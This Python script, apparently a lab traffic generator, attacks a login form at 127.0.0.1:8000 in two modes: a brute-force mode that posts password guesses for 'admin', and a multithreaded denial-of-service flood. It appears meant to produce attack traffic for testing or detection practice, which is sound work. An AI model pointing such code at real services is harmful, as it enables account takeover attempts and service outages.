import http.client
import sys
import threading
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8000
LOGIN_PATH = "/login"
USERNAME = "admin"
REQUEST_TIMEOUT_SECONDS = 2
MILLISECONDS_PER_SECOND = 1000
MODE_BRUTEFORCE = "bruteforce"
MODE_DOS = "dos"
REQUIRED_ARGUMENTS = 4
FORM_HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

sent_requests = 0
counter_lock = threading.Lock()

def send_request(body):
    try:
        connection = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=REQUEST_TIMEOUT_SECONDS)
        connection.request("POST", LOGIN_PATH, body=body, headers=FORM_HEADERS)
        response = connection.getresponse()
        response.read()
        connection.close()
        return True
    except (OSError, http.client.HTTPException):
        return False

def run_bruteforce(duration_seconds, delay_ms):
    end_time = time.time() + duration_seconds
    delay_seconds = delay_ms / MILLISECONDS_PER_SECOND
    attempt = 0
    while time.time() < end_time:
        body = f"username={USERNAME}&password=guess{attempt}"
        send_request(body)
        attempt = attempt + 1
        time.sleep(delay_seconds)
    print(f"Brute-force finished: {attempt} attempts")

def flood_worker(end_time, worker_index):
    global sent_requests
    local_count = 0
    while time.time() < end_time:
        body = f"worker={worker_index}&n={local_count}"
        send_request(body)
        local_count = local_count + 1
    with counter_lock:
        sent_requests = sent_requests + local_count

def run_dos(duration_seconds, thread_count):
    end_time = time.time() + duration_seconds
    workers = []
    for index in range(thread_count):
        worker = threading.Thread(target=flood_worker, args=(end_time, index))
        worker.start()
        workers.append(worker)
    for worker in workers:
        worker.join()
    print(f"DoS finished: {sent_requests} requests from {thread_count} threads")

def main():
    if len(sys.argv) < REQUIRED_ARGUMENTS:
        print("Usage: traffic_gen.py bruteforce SECONDS DELAY_MS | dos SECONDS THREADS")
        return
    mode = sys.argv[1]
    duration_seconds = int(sys.argv[2])
    parameter = int(sys.argv[3])
    if mode == MODE_BRUTEFORCE:
        run_bruteforce(duration_seconds, parameter)
    elif mode == MODE_DOS:
        run_dos(duration_seconds, parameter)
    else:
        print(f"[!] Unknown mode: {mode}")

if __name__ == "__main__":
    main()